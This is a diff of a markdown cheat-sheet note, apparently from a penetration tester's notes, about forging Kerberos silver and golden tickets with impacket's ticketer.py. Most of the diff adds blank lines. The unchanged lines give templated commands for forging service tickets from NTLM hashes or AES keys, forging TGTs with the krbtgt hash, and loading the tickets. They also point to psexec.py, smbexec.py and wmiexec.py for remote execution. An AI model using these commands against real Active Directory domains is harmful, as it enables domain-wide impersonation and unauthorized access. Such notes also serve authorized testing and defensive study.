@@ -11,12 +11,20 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # silver_ticket
 
+
+
 **Command** ([[to generate the TGS with NTLM]]):
 
 ```bash
 python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>
 
 ```
+
+
+
+
+
+
 
 **Command** ([[to generate the TGS with AES key]]):
 
@@ -25,6 +33,12 @@ python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_na
 
 ```
 
+
+
+
+
+
+
 **Command** ([[set the TGT for impacket use]]):
 
 ```bash
@@ -32,7 +46,13 @@ export KRB5CCNAME=<TGT_ccache_file>
 
 ```
 
+
+
+
+
 # golden_ticket
+
+
 
 **Command** ([[to generate the TGT with NTLM]]):
 
@@ -41,12 +61,24 @@ python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <
 
 ```
 
+
+
+
+
+
+
 **Command** ([[to generate the TGT with AES key]]):
 
 ```bash
 python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> <user_name>
 
 ```
+
+
+
+
+
+
 
 **Command** ([[set the ticket for impacket use]]):
 
@@ -55,4 +87,10 @@ export KRB5CCNAME=<TGS_ccache_file>
 
 ```
 
+
+
+
+
 search for psexec.py, smbexec.py or wmiexec.py
+
+
